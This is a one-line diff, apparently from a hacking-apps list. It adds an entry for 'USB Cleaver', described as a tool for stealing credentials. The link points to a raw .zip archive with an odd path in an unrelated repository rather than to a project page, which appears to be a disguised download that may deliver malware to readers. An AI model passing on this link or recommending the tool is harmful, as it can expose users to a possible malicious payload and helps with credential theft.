+- **[USB Cleaver](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - USB hacking tool for stealing credentials.
 
 ---
 
